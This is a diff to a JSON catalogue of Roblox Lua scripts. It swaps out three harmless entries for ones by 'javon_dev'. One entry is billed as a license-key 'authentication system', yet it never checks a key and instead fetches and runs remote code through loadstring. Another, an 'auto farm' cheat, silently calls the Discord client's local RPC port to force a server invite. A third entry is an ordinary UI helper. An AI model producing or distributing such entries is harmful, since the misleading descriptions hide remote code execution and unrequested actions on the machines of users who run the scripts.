@@ -1,26 +1,29 @@
 [
   {
-    "title": "Advanced FPS Counter",
-    "author": "TunaDev",
+    "title": "Tuna Scripts V2 [AUTH SYSTEM]",
+    "author": "javon_dev",
+    "rating": 5.0,
+    "category": "Utility",
+    "views": "14.2k",
+    "description": "The official V2 authentication system. Validates user license keys and securely routes to the main GitHub repository.",
+    "code": "local key = _G.LicenseKey\nif key then\n\tprint(\"Authenticating...\")\n\tloadstring(game:HttpGet(\"https://raw.githubusercontent.com/TunaScripts/Azren/refs/heads/main/Games\"))()\nelse\n\tgame.Players.LocalPlayer:Kick(\"Invalid Tuna Scripts V2 Key\")\nend"
+  },
+  {
+    "title": "Violence District [AUTO FARM + LOG]",
+    "author": "javon_dev",
+    "rating": 4.9,
+    "category": "World",
+    "views": "8.5k",
+    "description": "Complete auto-generator and walk script for Violence District. Includes the new forced RPC Discord invite protocol.",
+    "code": "-- Update Log: Added toggle functionality & Discord RPC\nlocal function JoinDiscord()\n\tlocal inviteCode = \"yrVfhkvdAb\"\n\tlocal http = game:GetService(\"HttpService\")\n\tlocal req = (syn and syn.request) or request or http_request\n\tif req then\n\t\treq({\n\t\t\tUrl = \"http://127.0.0.1:6463/rpc?v=1\",\n\t\t\tMethod = \"POST\",\n\t\t\tHeaders = {[\"Content-Type\"] = \"application/json\", [\"origin\"] = \"https://discord.com\"},\n\t\t\tBody = http:JSONEncode({args = {code = inviteCode}, cmd = \"INVITE_BROWSER\", nonce = string.lower(http:GenerateGUID(false))})\n\t\t})\n\tend\nend\nJoinDiscord()"
+  },
+  {
+    "title": "Premium UI Framework [CYBER NEON]",
+    "author": "javon_dev",
     "rating": 4.8,
     "category": "UI",
-    "description": "A lightweight UI script that tracks and displays the frames per second in real-time.",
-    "code": "local RunService = game:GetService(\"RunService\")\nlocal fpsLabel = script.Parent\nRunService.RenderStepped:Connect(function(step)\n\tlocal fps = math.floor(1 / step)\n\tfpsLabel.Text = \"FPS: \" .. fps\nend)"
-  },
-  {
-    "title": "Smooth Day/Night Cycle",
-    "author": "SolarFlare",
-    "rating": 4.5,
-    "category": "World",
-    "description": "Automatically cycles the game lighting time of day smoothly.",
-    "code": "local Lighting = game:GetService(\"Lighting\")\nlocal cycleSpeed = 0.1\nwhile true do\n\tLighting.ClockTime = Lighting.ClockTime + cycleSpeed\n\ttask.wait(0.5)\nend"
-  },
-  {
-    "title": "Simple Auto-Sprint",
-    "author": "SpeedyG",
-    "rating": 4.2,
-    "category": "Utility",
-    "description": "Increases player walk speed while holding the Left Shift key.",
-    "code": "local UIS = game:GetService(\"UserInputService\")\nlocal player = game.Players.LocalPlayer\nUIS.InputBegan:Connect(function(input)\n\tif input.KeyCode == Enum.KeyCode.LeftShift then\n\t\tplayer.Character.Humanoid.WalkSpeed = 24\n\tend\nend)\nUIS.InputEnded:Connect(function(input)\n\tif input.KeyCode == Enum.KeyCode.LeftShift then\n\t\tplayer.Character.Humanoid.WalkSpeed = 16\n\tend\nend)"
+    "views": "22.1k",
+    "description": "Custom UI library featuring glassmorphism and blue accent text. Fully updated to include the missing createLabel function.",
+    "code": "local Library = {}\n\nfunction Library:CreateWindow(title)\n\t-- Window Generation Logic\nend\n\nfunction Library:createLabel(parent, text)\n\tlocal label = Instance.new(\"TextLabel\")\n\tlabel.Parent = parent\n\tlabel.Text = text\n\tlabel.TextColor3 = Color3.fromRGB(0, 240, 255) -- Cyber Blue\n\tlabel.BackgroundTransparency = 1\n\treturn label\nend\n\nreturn Library"
   }
 ]
